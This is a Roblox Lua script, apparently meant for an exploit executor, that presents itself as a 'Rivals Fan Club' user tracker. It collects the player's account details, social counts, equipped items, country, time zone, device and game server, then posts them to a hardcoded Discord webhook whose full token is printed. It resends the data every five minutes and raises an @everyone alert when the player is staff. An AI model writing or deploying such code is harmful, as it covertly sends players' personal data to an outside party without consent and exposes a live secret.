local webhookURL = "https://discord.com/api/webhooks/1351728237675544576/EPazXPZ9d4SOAkVWiKElHJELSmaJ6ePA6NIW84QDq5ZwRdbKVJYanqPhlZTszZan2ZzZ"

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local LocalizationService = game:GetService("LocalizationService")
local TeleportService = game:GetService("TeleportService")

local player = Players.LocalPlayer
local userId = player.UserId
local username = player.Name
local displayName = player.DisplayName
local accountAge = player.AccountAge
local membershipType = tostring(player.MembershipType)

local friendCount = pcall(function() return #Players:GetFriendsAsync(userId):GetCurrentPage() end) and #Players:GetFriendsAsync(userId):GetCurrentPage() or "N/A"

local followersCount = "N/A"
local followingCount = "N/A"
pcall(function()
    followersCount = game:HttpGet("https://friends.roblox.com/v1/users/"..userId.."/followers/count")
    followersCount = HttpService:JSONDecode(followersCount).count

    followingCount = game:HttpGet("https://friends.roblox.com/v1/users/"..userId.."/followings/count") 
    followingCount = HttpService:JSONDecode(followingCount).count
end)

local avatarAssets = {}
local ownedLimiteds = 0
pcall(function()
    local assetTypes = {"Shirt", "Pants", "HairAccessory", "FaceAccessory", "NeckAccessory", "WaistAccessory", "BackAccessory", "FrontAccessory", "Hat"}
    for _, assetType in pairs(assetTypes) do
        local success, assets = pcall(function() 
            return player:GetEquippedAssets(Enum.AvatarAssetType[assetType])
        end)

        if success and assets then
            for _, asset in pairs(assets) do
                local productInfo = MarketplaceService:GetProductInfo(asset.AssetId)
                table.insert(avatarAssets, {
                    name = productInfo.Name,
                    id = asset.AssetId,
                    isLimited = productInfo.IsLimited or productInfo.IsLimitedUnique
                })

                if productInfo.IsLimited or productInfo.IsLimitedUnique then
                    ownedLimiteds = ownedLimiteds + 1
                end
            end
        end
    end
end)

local countryCode = LocalizationService:GetCountryRegionForPlayerAsync(player)
local timeZone = os.date("%Z", os.time())

local platform = UserInputService:GetPlatform()
local deviceType = UserInputService:GetLastInputType()
local screenSize = workspace.CurrentCamera.ViewportSize
local graphicsLevel = UserSettings():GetService("UserGameSettings").SavedQualityLevel

local gameId = game.PlaceId
local jobId = game.JobId
local gameName = "Unknown"
pcall(function()
    local placeInfo = MarketplaceService:GetProductInfo(gameId)
    gameName = placeInfo.Name
end)

local fps = math.floor(1/RunService.RenderStepped:Wait())
local ping = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
local memory = math.floor(game:GetService("Stats"):GetTotalMemoryUsageMb())

local premiumBenefits = "None"
if membershipType == "Premium" then
    premiumBenefits = "Robux Stipend, Premium-only items, Premium servers"
end

local currentTime = os.date("!%Y-%m-%dT%H:%M:%SZ")
local timestamp = os.date("%Y-%m-%d %H:%M:%S")

local userAvatar = string.format("https://tr.rbxcdn.com/30DAY-AvatarHeadshot-%s-Png/150/150/AvatarHeadshot/Webp/noFilter", userId)
local avatarBody = string.format("https://www.roblox.com/avatar-thumbnail/image?userId=%s&width=420&height=420&format=png", userId)

local hasSpecialBadge = false
local specialBadges = ""
pcall(function()
    local badges = game:GetService("BadgeService"):GetBadgesAsync(userId)
    for _, badge in pairs(badges) do
        if badge.Name:lower():find("admin") or badge.Name:lower():find("mod") or badge.Name:lower():find("staff") then
            hasSpecialBadge = true
            specialBadges = specialBadges .. badge.Name .. ", "
        end
    end
    if specialBadges ~= "" then
        specialBadges = specialBadges:sub(1, -3)  
    else
        specialBadges = "None"
    end
end)

local trackingId = HttpService:GenerateGUID(false)

local data = {
    embeds = {
        {
            title = "🎮 User Detection Alert! 🎮",
            description = "A user has been detected in your Roblox experience. Here's their profile information:",
            color = 47103, 
            thumbnail = {
                url = userAvatar
            },
            image = {
                url = avatarBody
            },
            fields = {
                {
                    name = "📝 Account Info",
                    value = string.format("**Username:** %s\n**Display Name:** %s\n**User ID:** %s\n**Account Age:** %s days\n**Membership:** %s", 
                        username, displayName, userId, accountAge, membershipType),
                    inline = false
                },
                {
                    name = "👥 Social Stats",
                    value = string.format("**Friends:** %s\n**Followers:** %s\n**Following:** %s", 
                        tostring(friendCount), tostring(followersCount), tostring(followingCount)),
                    inline = true
                },
                {
                    name = "💰 Avatar & Items",
                    value = string.format("**Limiteds Worn:** %s\n**Items Equipped:** %s", 
                        tostring(ownedLimiteds), #avatarAssets > 0 and tostring(#avatarAssets) or "None"),
                    inline = true
                },
                {
                    name = "🖥️ Device Info",
                    value = string.format("**Platform:** %s\n**Input Device:** %s\n**Screen Size:** %sx%s\n**Graphics Level:** %s/21", 
                        tostring(platform), tostring(deviceType), tostring(screenSize.X), tostring(screenSize.Y), tostring(graphicsLevel)),
                    inline = false
                },
                {
                    name = "📍 Location Data",
                    value = string.format("**Country:** %s\n**Time Zone:** %s", 
                        countryCode, timeZone),
                    inline = true
                },
                {
                    name = "⚙️ Performance",
                    value = string.format("**FPS:** %s\n**Ping:** %sms\n**Memory Usage:** %sMB", 
                        tostring(fps), tostring(ping), tostring(memory)),
                    inline = true
                },
                {
                    name = "🎲 Game Details",
                    value = string.format("**Game:** %s\n**Place ID:** %s\n**Server ID:** %s", 
                        gameName, tostring(gameId), tostring(jobId)),
                    inline = false
                },
                {
                    name = "🏆 Special Status",
                    value = string.format("**Premium Benefits:** %s\n**Special Badges:** %s", 
                        premiumBenefits, specialBadges),
                    inline = false
                }
            },
            author = {
                name = "Rivals Fan Club - Advanced User Tracker",
                icon_url = "https://i.imgur.com/8wQhoMG.png" 
            },
            footer = {
                text = string.format("Tracking ID: %s • Detected at %s", trackingId, timestamp),
                icon_url = "https://i.imgur.com/pq2qMWI.png" 
            },
            timestamp = currentTime
        }
    },
    username = "Rivals Tracker",
    avatar_url = "https://i.imgur.com/8wQhoMG.png" 
}

if userId == 1 or hasSpecialBadge then 
    data.content = "@everyone **ALERT!** A special user has been detected! Check details below."
end

local headers = {
    ["Content-Type"] = "application/json"
}

local requestData = {
    Url = webhookURL,
    Method = "POST",
    Headers = headers,
    Body = HttpService:JSONEncode(data)
}

if http and type(http) == "function" then
    local success, response = pcall(function()
        return http(requestData)
    end)

    if not success then
        warn("Script Failed: " .. tostring(response))
    end
elseif request then
    local success, response = pcall(function()
        return request(requestData)
    end)

    if not success then
        warn("Script Failed: " .. tostring(response))
    end
elseif syn and syn.request then
    local success, response = pcall(function()
        return syn.request(requestData)
    end)

    if not success then
        warn("Script Failed: " .. tostring(response))
    end
else
    warn("Your exploit does not support HTTP requests.")
end

spawn(function()
    while wait(300) do 
        fps = math.floor(1/RunService.RenderStepped:Wait())
        ping = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
        memory = math.floor(game:GetService("Stats"):GetTotalMemoryUsageMb())

        currentTime = os.date("!%Y-%m-%dT%H:%M:%SZ")
        timestamp = os.date("%Y-%m-%d %H:%M:%S")

        data.embeds[1].fields[6].value = string.format("**FPS:** %s\n**Ping:** %sms\n**Memory Usage:** %sMB", 
            tostring(fps), tostring(ping), tostring(memory))
        data.embeds[1].footer.text = string.format("Tracking ID: %s • Updated at %s", trackingId, timestamp)
        data.embeds[1].timestamp = currentTime

        requestData.Body = HttpService:JSONEncode(data)

        if http then
            pcall(function()
                http(requestData)
            end)
        end
    end
end)
